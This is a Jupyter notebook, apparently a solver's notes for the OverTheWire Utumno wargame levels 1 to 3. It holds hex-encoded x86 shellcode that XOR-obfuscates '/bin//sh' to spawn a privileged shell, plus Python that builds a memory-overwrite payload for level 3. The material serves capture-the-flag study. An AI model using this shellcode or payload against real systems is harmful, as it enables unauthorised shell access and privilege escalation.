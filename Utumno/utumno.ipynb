{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# utumno1\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x978cd091\n",
      "0x969dd0d0\n"
     ]
    }
   ],
   "source": [
    "print(hex(0x68732F6E ^ 0xFFFFFFFF))\n",
    "print(hex(0x69622F2F ^ 0xFFFFFFFF))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'j1X\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1jFX\\xcd\\x80\\xb0\\x0bR\\xba\\x91\\xd0\\x8c\\x97\\x83\\xf2\\xffR\\xba\\xd0\\xd0\\x9d\\x96\\x83\\xf2\\xffR1\\xd2\\x89\\xe3\\x89\\xd1\\xcd\\x80'\n"
     ]
    }
   ],
   "source": [
    "import binascii\n",
    "\n",
    "shellcode_hex = \"6a315899cd8089c389c16a4658cd80b00b52ba91d08c9783f2ff52bad0d09d9683f2ff5231d289e389d1cd80\"\n",
    "shellcode_bytes = binascii.unhexlify(shellcode_hex)\n",
    "\n",
    "print(shellcode_bytes)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Utumno2\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'l/ni'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bytes.fromhex(\"6c2f6e69\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Utumno3\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "97\n",
      "98\n",
      "103\n",
      "104\n",
      "109\n",
      "110\n",
      "115\n",
      "116\n",
      "121\n",
      "122\n",
      "127\n",
      "64\n",
      "69\n",
      "70\n",
      "75\n",
      "76\n",
      "81\n",
      "82\n",
      "87\n",
      "88\n",
      "93\n",
      "94\n",
      "35\n",
      "36\n",
      "[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 98, 98, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 98, 0, 0, 0, 0, 98, 98, 0, 0, 0, 0, 98, 98, 0, 0, 0, 0, 98, 98, 0, 0, 0, 0, 98, 98, 0, 0, 0, 0, 98, 98, 0, 0, 98, 98, 0, 0, 0, 0, 98, 98, 0, 0, 0, 0, 98, 98, 0, 0, 0, 0, 98, 98, 0, 0, 0, 0, 98, 98, 0, 0, 0, 0, 98, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n"
     ]
    }
   ],
   "source": [
    "b = [0] * 24  # List to imitate the `char` array for `b` in C\n",
    "a = [0] * 256  # Larger list for `a` to mimic array indexing behavior\n",
    "i = 0\n",
    "\n",
    "while True:\n",
    "    char1 = \"a\"\n",
    "    char1 = ord(char1[0])  # Convert the character to its ASCII value\n",
    "    if i > 23:\n",
    "        break\n",
    "\n",
    "    b[i] = char1\n",
    "    b[i] = b[i] ^ i * 3  # Perform XOR logic, similar to the C code\n",
    "\n",
    "    char2 = \"b\"\n",
    "    a[b[i]] = ord(char2[0])  # Assign the next input (as integer) to `a` at index `b[i]`\n",
    "    print(b[i])\n",
    "    i += 1\n",
    "\n",
    "print(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'$A&A A.A$A&A8A>A4A6A0A\\x0eA\\x14A\\x16A\\x18A\\x1eA\\x04A\\x06A\\x00A\\x0eA\\x04A\\x06AxA~A'\n"
     ]
    }
   ],
   "source": [
    "import struct\n",
    "import sys\n",
    "\n",
    "start_index = 36\n",
    "target_address = struct.pack(\"<I\", 0x41414141)\n",
    "# target_address = bytes.fromhex(\"41\" * 4)\n",
    "# print(f\"target_address: {target_address}\")\n",
    "\n",
    "input = b\"\"\n",
    "for i in range(24):\n",
    "    input += ((start_index + i) ^ (i * 3)).to_bytes(1, \"big\")\n",
    "    input += target_address[i % 4].to_bytes(1, \"big\")\n",
    "# print(input)\n",
    "try:\n",
    "    sys.stdout.buffer.write(input)\n",
    "except AttributeError:\n",
    "    print(input)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
